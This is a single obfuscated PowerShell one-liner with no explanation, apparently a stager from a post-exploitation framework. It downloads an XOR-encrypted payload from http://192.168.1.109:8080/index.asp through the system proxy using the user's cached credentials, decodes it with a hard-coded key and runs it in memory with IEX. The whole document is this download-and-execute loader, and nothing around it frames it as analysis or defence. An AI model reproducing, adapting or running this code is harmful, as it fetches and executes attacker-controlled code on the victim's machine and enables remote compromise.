
[SySteM.Net.SerVicEPoiNTMaNager]::EXpECt100ContINUe = 0;$WC=NEw-OBjeCt SysTeM.NET.WEbCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeADeRS.Add('User-Agent',$u);$wC.ProxY = [SYsTem.Net.WEBREqUEsT]::DEfauLTWEbPrOxy;$wc.PROXY.CReDEnTiALS = [SysTeM.NeT.CrEdENtiALCAcHe]::DEFAultNeTwOrkCREDENTials;$K='9cdfb439c7876e703e307864c9167a15';$I=0;[CHar[]]$B=([cHaR[]]($wC.DoWNLoadStRing("http://192.168.1.109:8080/index.asp")))|%{$_-BXor$K[$i++%$K.LEnGth]};IEX ($B-jOIn'')

